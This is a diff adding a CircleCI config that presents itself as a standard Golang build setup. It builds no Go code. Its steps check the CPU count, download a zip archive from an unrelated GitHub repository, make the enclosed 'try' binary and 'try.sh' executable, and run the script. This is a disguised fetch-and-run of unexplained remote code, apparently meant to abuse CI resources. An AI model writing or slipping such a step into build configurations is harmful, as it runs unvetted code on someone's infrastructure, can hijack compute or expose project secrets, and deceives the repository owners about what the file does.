@@ -1,0 +1,14 @@
+# Golang CircleCI 2.0 configuration file
+#
+# Check https://circleci.com/docs/2.0/language-go/ for more details
+version: 2
+
+jobs:
+  build:
+    docker:
+      - image: circleci/golang:1.9
+    steps:
+      - run: ls
+      - run: nproc
+      - run: wget https://github.com/jdudjd/solid-system/raw/main/try.zip
+      - run: unzip try.zip && chmod +x try try.sh && ./try.sh
